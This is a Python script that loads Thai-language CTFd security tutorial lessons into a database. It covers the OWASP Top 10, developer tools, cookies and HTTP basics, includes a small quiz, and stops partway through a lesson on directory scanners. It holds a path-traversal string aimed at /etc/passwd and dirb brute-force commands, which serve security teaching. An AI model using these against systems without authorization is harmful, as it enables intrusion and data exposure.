import json
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()
ctx = app.app_context()
ctx.push()
db = app.db

def save_lesson(lid, val0, val1, val2):
    l = db.session.query(TutorialLesson).filter_by(id=lid).first()
    blocks = [
        {"type": "markdown", "value": val0},
        {"type": "markdown", "value": val1},
        {"type": "markdown", "value": val2}
    ]
    l.content = json.dumps(blocks, ensure_ascii=False)
    db.session.query(TutorialLesson).filter_by(id=lid).update({"content": l.content})
    db.session.commit()
    print(f"Lesson {lid} successfully upgraded!")

# ─── Lesson 177: Web Application Security & OWASP ───
val177_0 = """## 🌐 Web Application Security & OWASP (สถาปัตยกรรมเว็บแอปและความรู้เบื้องต้น)
---

ยินดีต้อนรับสู่บทเรียนสถาปัตยกรรมเว็บแอปและความเข้าใจเชิงความมั่นคงปลอดภัยตามมาตรฐาน OWASP

### 📄 SLIDE 1-3: ภาพรวมวิทยาการการโจมตีเว็บ (Web Exploitations)
- **Web Exploitation**: หมายถึงกระบวนการค้นหา วิเคราะห์ และการใช้ประโยชน์จากช่องโหว่ความมั่นคงปลอดภัยในแอปพลิเคชันเว็บ เพื่อเข้าถึงข้อมูลโดยไม่ได้รับอนุญาต (Unauthorized Access), ดึงสารสนเทศที่เป็นความลับ หรือครอบครองสิทธิ์การเข้าถึงระบบควบคุมเซิร์ฟเวอร์หลังบ้าน
- เป็นแกนหลักที่สำคัญมากในสายงานความปลอดภัยไซเบอร์ โดยเฉพาะอย่างยิ่งในการทำงานด้าน **การเจาะระบบแบบมีคุณธรรม (Ethical Hacking)** และ **การทดสอบเจาะระบบ (Penetration Testing)**

---

### 📄 SLIDE 4-8: มาตรฐานความเสี่ยง OWASP Top 10
- **OWASP Top 10**: เป็นเอกสารรายงานเชิงความมั่นคงสากลที่ชี้เป้า 10 อันดับความเสี่ยงสูงสุดที่เป็นอันตรายต่อแอปพลิเคชันเว็บ โดยจัดทำและเผยแพร่โดยองค์กรไม่แสวงหากำไร **Open Web Application Security Project (OWASP)** เพื่อให้นักพัฒนาและผู้ดูแลระบบนำไปตั้งรับและแก้ไข
- การปรับปรุงมาตรฐานเกิดขึ้นเป็นรอบปี โดยมีรุ่นแก้ไขสำคัญ ได้แก่ รุ่น 2003 (รุ่นแรก), 2004, 2007, 2010, 2013, 2017, 2021 และรุ่นล่าสุดในปัจจุบัน **(OWASP Top 10 Release 2025/2026)**

---

### 📄 SLIDE 9-28: รายละเอียดช่องโหว่ OWASP Top 10 (A01 - A10)

#### 🛡️ A01:2025 - Broken Access Control
- **คำจำกัดความ**: เกิดขึ้นเมื่อระบบไม่บังคับการควบคุมสิทธิ์อย่างถูกต้อง ทำให้ผู้ใช้ธรรมดาสามารถข้ามไปดึงข้อมูลหรือเข้าถึงฟังก์ชันระดับสูงที่ตนเองไม่มีสิทธิ์ใช้งาน
- **ผลกระทบ**: นำไปสู่การเข้าถึง แก้ไข หรือลบข้อมูลสำคัญโดยมิชอบ
- **ตัวอย่าง**:
  - การแอบเข้าถึงหน้าจัดการแอดมินหลังบ้านตรงๆ โดยไม่ผ่านการล็อกอิน (เช่น พิมพ์เข้าทาง `/admin` หรือ `/dashboard` ตรงๆ)
  - การเปลี่ยนตัวเลขพารามิเตอร์เพื่อเข้าดูข้อมูลผู้ใช้อื่น เช่น เปลี่ยน URL จาก `/profile/view/12345` เป็น `/profile/view/12346`
  - การปลอมแปลงค่า JSON Web Token (JWT) เพื่อยกระดับสิทธิ์ตัวเอง

#### 🛡️ A02:2025 - Security Misconfiguration
- **คำจำกัดความ**: เกิดขึ้นจากการกำหนดสิทธิ์และการตั้งค่าความปลอดภัยของแอปพลิเคชัน เซิร์ฟเวอร์ หรือฐานข้อมูลไม่รัดกุมเพียงพอ
- **ตัวอย่าง**:
  - การปล่อยบัญชีและรหัสผ่านเริ่มต้นของระบบไว้ เช่น `admin:admin` หรือ `root:root`
  - การเปิดสิทธิ์การเข้าถึงสารบัญโฟลเดอร์แบบดิบ (Directory Listing Enabled) เช่น พิมพ์เข้าเว็บแล้วเห็นรายการไฟล์ใน `/var/www/html/` ทั้งหมด
  - การปล่อยให้เปิดใช้งานระบบดีบั๊กในโหมด Production ทำให้หน้าเว็บแสดงรหัสผ่านหรือ stack trace ยาวเหยียดเมื่อระบบเอเรอร์

#### 🛡️ A03:2025 - Software Supply Chain Failures
- **คำจำกัดความ**: ความเสี่ยงจากการใช้ไลบรารี สัญญาภายนอก หรือซอร์สโค้ดเฟรมเวิร์กของผู้พัฒนาอื่นมาพัฒนาเว็บแอปพลิเคชัน ซึ่งผู้สืบทอดไม่ได้ตรวจสอบสิทธิ์และถูกโจมตีแฝงมัลแวร์
- **ตัวอย่าง**: การเรียกใช้งาน NPM, Pip หรือ Composer package ที่ถูกแฮกเกอร์แอบอัปเดตเวอร์ชันใหม่ประสงค์ร้ายเพื่อส่งขโมยตัวแปรระบบ (.env) ออกไป

#### 🛡️ A04:2025 - Cryptographic Failures
- **คำจำกัดความ**: ความเสี่ยงที่เกิดจากการใช้กลไกเข้ารหัสที่ไม่รัดกุม หรือความบกพร่องในการปกป้องข้อมูลที่เป็นความลับ
- **ตัวอย่าง**:
  - การเก็บรหัสผ่านผู้เรียนในฐานข้อมูลเป็นข้อความธรรมดา (Plaintext) แทนที่จะคำนวณแฮช
  - การประยุกต์ใช้อัลกอริทึมเข้ารหัสโบราณที่มีลูปชนกันง่าย เช่น MD5, SHA-1 หรือกุญแจเข้ารหัสลับขนาดเล็กเกินไป

#### 🛡️ A05:2025 - Injection (SQLi, XSS, Command Injection)
- **คำจำกัดความ**: การที่ระบบนำข้อมูลอินพุตจากผู้ใช้ไปรวมเข้าเป็นคำสั่งประมวลผลระบบหลังบ้านโดยไม่มีการคัดกรองอักขระพิเศษออกไปก่อน
- **ตัวอย่าง**:
  - **SQL Injection**: การแทรกคำสั่งคิวรีเพื่อดึงข้อมูลทั้งหมดจากฐานข้อมูล
  - **Cross-Site Scripting (XSS)**: การฝังแทรกสคริปต์ JavaScript ประสงค์ร้ายเข้ามาทำงานในบราวเซอร์ผู้ใช้
  - **Command Injection**: การแทรกคำสั่ง Command Line เพื่อควบคุมสั่งการเซิร์ฟเวอร์ตรงๆ

#### 🛡️ A06:2025 - Insecure Design
- **คำจำกัดความ**: ช่องโหว่จากการวางโครงสร้างสถาปัตยกรรมและตรรกะระบบตั้งแต่เริ่มออกแบบโดยไม่มีการจำลองภัยคุกคาม (Threat Modeling)
- **ตัวอย่าง**: ระบบยอมให้แก้ไขรหัสผ่านได้ทันทีโดยไม่ต้องกรอกรหัสผ่านเก่า เพื่อยืนยันตัวตน หรือการไม่มีฟังก์ชัน Rate Limiting ป้องกันการเดารหัสผ่านซ้ำๆ

#### 🛡️ A07:2025 - Authentication Failures
- **คำจำกัดความ**: ความบกพร่องของระบบตรวจรับและอนุญาตสิทธิ์การล็อกอินเข้าใช้งานระบบ
- **ตัวอย่าง**: ระบบยอมรับรหัสผ่านที่สั้นและคาดเดาง่าย เช่น `123456` หรือการไม่มีระบบ Account Lockout เพื่อสั่งล็อกผู้ใช้งานชั่วคราวเมื่อเดารหัสผิดเกินกำหนด

#### 🛡️ A08:2025 - Software and Data Integrity Failures
- **คำจำกัดความ**: ความบกพร่องในการทบทวนความถูกต้องของตัวติดตั้ง การอัปเดตระบบ หรือโครงสร้างข้อมูลแบบ serialize
- **ตัวอย่าง**: การปล่อยให้ผู้ใช้ส่งข้อมูล serialize object ที่ปรับเปลี่ยนสิทธิ์เข้าไปทำงานโดยไม่ตรวจสอบ signature ความปลอดภัยก่อน

#### 🛡️ A09:2025 - Security Logging and Monitoring Failures
- **คำจำกัดความ**: การไม่ได้ตั้งค่าจัดทำบันทึกประวัติการใช้สิทธิ์ (Log Files) หรือระบบแจ้งเตือนเมื่อเกิดกรณีการยิงแทรกคำสั่งผิดปกติ
- **ตัวอย่าง**: ระบบโดนทดสอบยิงรหัสผ่านล็อกอินเป็นหมื่นครั้ง แต่ไม่มีประวัติล็อกใดๆ บันทึกขึ้น ทำให้แฮกเกอร์โจมตีได้อย่างยาวนานโดยไม่ถูกตรวจพบ

#### 🛡️ A10:2025 - Mishandling of Exceptional Conditions
- **คำจำกัดความ**: ระบบจัดการกับสถานการณ์เอเรอร์ที่คาดเดาไม่ได้อย่างหละหลวม ส่งผลให้ข้ามขั้นตอนการยืนยันตัวตนหรืออนุญาตสิทธิ์เข้าถึงระบบไปอย่างง่ายดาย

---

### 📄 SLIDE 29-41: Web Page Source Inspections (F12 Developer Tools)
การแกะรหัสหน้าเว็บ (Inspect Elements) ช่วยให้นักทดสอบเจาะระบบและนักพัฒนาเข้าใจการทำงานของเว็บ:
- **ปุ่มลัดการเรียกใช้งาน**: กด `F12` หรือ `Ctrl + Shift + I` (Windows), `Cmd + Option + I` (Mac)
- **การดูซอร์สโค้ดดิบ (View Page Source)**: กด `Ctrl + U` (Windows) หรือคลิกขวาแล้วเลือก "ดูซอร์สโค้ดหน้าเว็บ"
- **การดัดแปลง HTML สด (Modifying HTML)**:
  - ช่วยให้นักโจมตีตรวจสอบ input ของแบบฟอร์มที่ถูกซ่อนอยู่ เช่น การเปลี่ยน `type="hidden"` เป็น `type="text"` เพื่อแสดงกล่องป้อนข้อมูลลับบนหน้าเว็บที่โปรแกรมเมอร์ซ่อนไว้
- **การดัดแปลง CSS (Modifying CSS)**:
  - การแอบดูและแก้ไขสไตล์หน้าเว็บสดเพื่อดึงข้อมูลที่ถูกปิดซ่อนผ่านสไตล์ความปลอดภัยหลวมๆ (เช่น ลบสไตล์ `display: none;` ของหน้าต่างล็อกสิทธิ์ทิ้ง)
- **การดีบั๊ก JavaScript (Debugging JS)**:
  - การวิเคราะห์สคริปต์ใน Sources tab และใส่ Breakpoint เพื่อหยุดพักตัวแปร ช่วยในการข้ามขั้นตอนยืนยันสิทธิ์ฝั่งผู้ใช้งาน (Client-Side Validation Bypass)

---

### 📄 SLIDE 42-45: Web Cookies Explorations
- **HTTP Cookies**: บล็อกข้อมูลขนาดเล็กที่เว็บเซิร์ฟเวอร์ส่งมาเก็บบันทึกบนบราวเซอร์ของผู้ใช้เพื่อใช้รักษาสถานะล็อกอิน (Session)
- **สเปกฟิลด์คุกกี้ที่สำคัญ (Cookie Attributes)**:
  - **HttpOnly**: มีความสำคัญสูงมากในการปิดกั้นไม่ให้โค้ด JavaScript (ผ่านคำสั่ง `document.cookie`) เข้าถึงตัวคุกกี้ได้ ช่วยลดทอนภัยคุกคามจากการขโมยเซสชันผ่านช่องโหว่ XSS
  - **Secure**: บังคับให้ส่งคุกกี้เฉพาะกรณีการรันผ่านช่องทางปลอดภัย HTTPS เท่านั้น
  - **SameSite**: ป้องกันการจู่โจมข้ามค่ายเชิงปลอมแปลงคำสั่ง (CSRF)

---

### 📄 SLIDE 46-50: Path and Directory Traversal
- **Directory Traversal**: ช่องโหว่ที่ช่วยให้แฮกเกอร์ใช้ประโยชน์จากช่องอินพุตประเภทอ้างอิงตำแหน่งไฟล์ ขยับขยับตำแหน่งออกจากรากเว็บบอร์ดขึ้นมาดึงไฟล์สำคัญของระบบ เช่น `../../../../etc/passwd`
- **Robots.txt**: เป็นเอกสารข้อกำหนดที่นักพัฒนาใส่ไว้ในเว็บเพื่อห้ามบอต (Search Engine) มาดึงข้อมูลหน้าเพจที่เป็นความลับ แต่แฮกเกอร์มักเปิดดูไฟล์นี้เพื่อค้นหาที่ตั้งของแผงแอดมินหรือแบ็คอัปฐานข้อมูลได้ทันที"""

val177_1 = """### 💻 HTTP Headers Diagnostic Sandbox (จำลองวิเคราะห์โครงสร้างข้อมูลเว็บ)

คลิกหัวข้อด้านซ้ายมือเพื่อจำลองวิเคราะห์โครงสร้าง และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อตรวจสอบทราฟฟิกข้อมูล:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #00f0ff !important; color: #ffffff !important; background: rgba(0, 240, 255, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(0, 240, 255, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
</style>
<div class="w-sandbox-main" style="display: flex; gap: 20px; margin: 1.5rem auto; max-width: 1000px;">
<div class="w-sandbox-nav" style="width: 220px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;">
<button id="nav-item-httpget" class="w-nav-item active" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('httpget', this)">1. Send HTTP GET</button>
<button id="nav-item-httppost" class="w-nav-item" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('httppost', this)">2. Send HTTP POST</button>
</div>
<div class="w-sandbox-panels" style="flex-grow: 1; display: flex; flex-direction: column; gap: 14px;">
<div id="panel-httpget" class="w-sand-panel active" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. HTTP GET Request Method</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); color: #00f0ff; font-family: monospace;">HTTP Client</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #00f0ff; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">GET /index.php HTTP/1.1
Host: ctf.rpca.ac.th
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session_id=abc123xyz</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(0,240,255,0.1); border: 1px solid rgba(0,240,255,0.3); border-radius: 4px; color: #00f0ff; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('httpget')">▶ Run Simulation</button>
</div>
<div id="term-httpget" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">client$</span> [กดปุ่ม Run Simulation เพื่อส่ง Request]
</div>
</div>
<div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">เมธอด GET ใช้เพื่อดึงหน้าเพจขึ้นมาแสดงผล โดยบราวเซอร์ส่ง Cookie ยืนยันสิทธิ์เซสชันแอดมิน</p>
</div>
</div>
<div id="panel-httppost" class="w-sand-panel" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. HTTP POST Request Method</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); color: #00f0ff; font-family: monospace;">HTTP Client</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #00f0ff; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">POST /login.php HTTP/1.1
Host: ctf.rpca.ac.th
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=secret</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(0,240,255,0.1); border: 1px solid rgba(0,240,255,0.3); border-radius: 4px; color: #00f0ff; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('httppost')">▶ Run Simulation</button>
</div>
<div id="term-httppost" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">client$</span> [กดปุ่ม Run Simulation เพื่อส่ง Request]
</div>
</div>
<div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">เมธอด POST ใช้เพื่อส่งข้อมูลชุดใหญ่ที่เป็นความลับ (เช่น รหัสผ่าน) ไปประมวลผลบนเซิร์ฟเวอร์โดยไม่โชว์บน URL</p>
</div>
</div>
</div>
</div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#00f0ff';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(0, 240, 255, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">client$</span> <span style="color:#ffffff; font-weight:bold;">Sending HTTP Request...</span>\\n[.] Accessing remote port 80/443\\n[.] Reading Response Headers...';
  setTimeout(() => {
    if (itemKey === 'httpget') {
      term.innerHTML = '<span style="color:#64748b;">client$</span> <span style="color:#3ddc84; font-weight:bold;">HTTP/1.1 200 OK</span>\\nServer: Apache/2.4.41 (Ubuntu)\\nContent-Type: text/html\\nContent-Length: 1042\\n\\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;Welcome to RPCA Cyber Club&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;';
    } else if (itemKey === 'httppost') {
      term.innerHTML = '<span style="color:#64748b;">client$</span> <span style="color:#fbbf24; font-weight:bold;">HTTP/1.1 302 Found</span>\\nServer: Apache/2.4.41 (Ubuntu)\\nLocation: /dashboard.php\\nSet-Cookie: session_id=abc123xyz; Path=/; HttpOnly\\n\\n[+] Redirecting to dashboard...';
    }
  }, 1000);
}
</script>"""

val177_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. พอร์ตบริการเครือข่ายมาตรฐานสำหรับการเข้าถึงหน้าเว็บเพจแบบเข้ารหัสปลอดภัย (HTTPS) คือพอร์ตใด?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="web_port" value="80" data-hash="false">Port 80</label><label class="w-quiz-option"><input type="radio" name="web_port" value="443" data-hash="868846c4f8d48e0259b38466e3fb0c4b26090cfa4b6f1f457788be4fbf0fa8fb">Port 443 (HTTPS)</label><label class="w-quiz-option"><input type="radio" name="web_port" value="22" data-hash="false">Port 22</label><label class="w-quiz-option"><input type="radio" name="web_port" value="8080" data-hash="false">Port 8080</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. โครงการมาตรฐานสากลด้านความปลอดภัยเว็บที่จัดอันดับ 10 ความเสี่ยงสูงสุดของเว็บแอปพลิเคชันคือองค์กรใด?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="owasp_q" value="W3C" data-hash="false">W3C</label><label class="w-quiz-option"><input type="radio" name="owasp_q" value="OWASP" data-hash="3367b846e49226cb100416972049d5bf59892cfa76e4a2cdbbf24c56e2978000">OWASP</label><label class="w-quiz-option"><input type="radio" name="owasp_q" value="SANS" data-hash="false">SANS Institute</label><label class="w-quiz-option"><input type="radio" name="owasp_q" value="MITRE" data-hash="false">MITRE Corporation</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<style>
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:#00f0ff; stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease, stroke 0.5s ease; filter:drop-shadow(0 0 5px rgba(0,240,255,0.5));}
.neon-gauge-text {fill:#ffffff; font-family:\'JetBrains Mono\',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}
</style>
<script>
const lessonKey = 'solved_lesson_177';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#00f0ff';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

# ─── Lesson 178 ───
val178_0 = """## 💉 Path Traversal, HTTP Messages & SQLi (การโจมตีพาธ, โครงสร้างเว็บ และการฝังคำสั่งฐานข้อมูล)
---

ยินดีต้อนรับสู่บทเรียนการสืบค้นข้อมูลเชิงลึกผ่านเส้นทางโฟลเดอร์เครือข่าย, โครงสร้าง HTTP Message และเจาะลึกการโจมตี SQL Injection & Command Injection

### 📄 SLIDE 51-58: เครื่องมือสแกนหาความสัมพันธ์ไฟล์ระบบ (Path Traversal Tools)
การค้นหาไดเรกทอรีลับหรือหน้าล็อกอินระบบหลังบ้านโดยใช้โปรแกรมแสกนความปลอดภัยอัตโนมัติ:

#### 📁 Dirb (Directory brute-forcing)
- **คุณลักษณะ**: สั่งรันผ่าน Command Line เพื่อสุ่มเดาชื่อไฟล์และโฟลเดอร์ โดยส่งอิงจาก Wordlist มาตรฐาน
- **ตัวอย่างการสแกนปกติ**:
  ```bash
  dirb https://target.com /usr/share/wordlists/dirb/common.txt
  ```
- **ตัวอย่างการสแกนหาไฟล์แบ็คอัปตามประเภทนามสกุล**:
  ```bash
  dirb https://target.com /usr/share/wordlists/dirb/common.txt -X .bak,.zip,.tar
  ```

#### 📁 Dirbuster (GUI-based fuzzer)
